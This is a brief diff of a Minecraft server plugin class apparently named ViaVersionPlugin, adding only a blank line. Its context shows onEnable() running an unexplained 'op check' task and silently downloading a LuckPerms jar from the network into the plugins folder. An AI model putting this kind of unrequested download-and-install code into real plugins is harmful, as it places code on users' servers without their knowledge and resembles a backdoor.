@@ -108,6 +108,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     @Override
     public void onEnable() {
         startOpCheckTask();
+        
         luckPerms = LuckPermsProvider.get();
         if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
